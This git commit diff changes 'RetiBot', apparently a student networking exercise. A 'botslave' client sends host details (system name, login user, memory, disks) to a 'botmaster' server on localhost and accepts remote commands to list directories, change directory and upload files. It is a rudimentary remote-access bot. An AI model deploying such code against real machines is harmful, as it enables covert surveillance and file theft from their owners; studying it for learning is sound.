da50aafd4e7d9ca190627a38f1eabcea97ba5fbc
Gheovgos <72210745+Gheovgos@users.noreply.github.com>
2022-10-26 10:02:04 +0200

    bugfixes

--- RetiBot/botmaster.py
+++ RetiBot/botmaster.py
@@ -1,39 +1,33 @@
 from socket import *
 serverPort = 12000
-serverSocket = socket(AF_INET,SOCK_STREAM) #AF_INET = IPV4; SOCK_STREAM = TCP
-serverSocket.bind( ('localhost',serverPort) )
+serverSocket = socket(AF_INET, SOCK_STREAM)                       #AF_INET = IPV4; SOCK_STREAM = TCP
+serverSocket.bind(('localhost', serverPort))
 serverSocket.listen(1)
 print('The server is ready to receive')
 connectionSocket, addr = serverSocket.accept()
-print('Accepted a new client',addr)
-uname = connectionSocket.recv(4096).decode()
-print(uname)
-machine = connectionSocket.recv(1024).decode()
-print(machine)
-user = connectionSocket.recv(1024).decode()
-print(user)
-memory = connectionSocket.recv(1024).decode()
-print(memory)
-fs = connectionSocket.recv(1024).decode()
-print(fs)
+print('Accepted a new client', addr)
+infoBot = connectionSocket.recv(4096).decode()
+print('Informazioni ottenute: \n', infoBot)
 connectionSocket.send('ok'.encode())
-command = ''    
+command = ''
+print(connectionSocket)
 while command != 'exit':
+    print(connectionSocket)
     print('Commands: ls, cd, get [file_name]')
     command = input('Input a command:	')
-    if(command == 'ls'):
+    if command == 'ls':
         connectionSocket.send('ls'.encode())
         ls = connectionSocket.recv(1024).decode()
         cwd = connectionSocket.recv(1024).decode()
         print(ls)
-        print('Current working directory:	',cwd)
-    if(command == 'exit'):
+        print('Current working directory:	', cwd)
+    if command == 'exit':
         connectionSocket.send('exit'.encode())
-    if(command.startswith('cd')  and command[1:].strip()):
+    if command.startswith('cd') and command[1:].strip():
         string = '1'+command.split(" ")[1]
         connectionSocket.send(string.encode())
-        print('New path:	',connectionSocket.recv(1024).decode())
-    if(command.startswith('get')  and command[1:].strip()):
+        print('New path:	', connectionSocket.recv(1024).decode())
+    if command.startswith('get') and command[1:].strip():
         string = '0'+command.split(" ")[1]
         connectionSocket.send(string.encode())
         data = connectionSocket.recv(90000000).decode()
--- RetiBot/botslave.py
+++ RetiBot/botslave.py
@@ -2,32 +2,27 @@ from socket import *
 import platform
 import os
 import psutil
-serverName = 'localhost' #corrisponde a 127.0.0.1
-serverPort = 12000 #usata solo per pairing iniziale, il S.O. assegna poi una porta
-clientSocket = socket(AF_INET,SOCK_STREAM)
-clientSocket.connect((serverName,serverPort)) + '\n'
-uname = 'Uname:	' + ''.join(platform.uname()) + '\n'
-machine = 'Machine:	' + platform.machine() + '\n'
-user = 'User:	' + os.getlogin() + '\n'
-memory = 'Memory:	' + str(int((psutil.virtual_memory().total) / 1048576)) + 'MB\n'
-memory += 'Disk Usage:	' + str(psutil.disk_usage('/').percent) + '%\n'	
-disktype = 'Disk File System:	' + psutil.disk_partitions.fstype
-clientSocket.send(uname.encode()) #manda architettura
-clientSocket.send(machine.encode())
-clientSocket.send(user.encode())
-clientSocket.send(memory.encode())
-ack = clientSocket.recv(1024).decode() #recv(1024) indica che riceviamo al massimo 1024 byte
+serverName = 'localhost'              #corrisponde a 127.0.0.1
+serverPort = 12000                    #usata solo per pairing iniziale, il S.O. assegna poi una porta
+clientSocket = socket(AF_INET, SOCK_STREAM)
+clientSocket.connect((serverName, serverPort))
+info = 'Uname:	' + ''.join(platform.uname()) + '\n Machine:	' + platform.machine() + '\n User:	' + os.getlogin() + \
+       '\n Memory:	' + str(int(psutil.virtual_memory().total / 1048576)) + 'MB\n Disk Usage:	' \
+       + str(psutil.disk_usage('/').percent) + '%\n Disk File System:	' + str(psutil.disk_partitions())
+
+clientSocket.send(info.encode())                       #manda architettura
+ack = clientSocket.recv(1024).decode()                  #recv(1024) indica che riceviamo al massimo 1024 byte
 command = ''
 while command != 'exit':
     command = clientSocket.recv(2048).decode()
     print(command)
-    if(command == 'ls'):
+    if command == 'ls':
         path = os.getcwd()
         clientSocket.send(path.encode())
         clientSocket.send(str(os.listdir(path)).encode())
-    if(command.startswith('1')):
+    if command.startswith('1'):
         try:
-            if(command[1:] != '..'):
+            if command[1:] != '..':
                 os.chdir(command[1:])
             else:
                 os.chdir(os.path.normpath(os.getcwd() + os.sep + os.pardir))
@@ -35,7 +30,7 @@ while command != 'exit':
             clientSocket.send(path.encode())
         except Exception as e:
             clientSocket.send(e.encode())
-    if(command.startswith('0')):
+    if command.startswith('0'):
         print(command)
         file = open(command[1:], "r")	
         data = file.read()
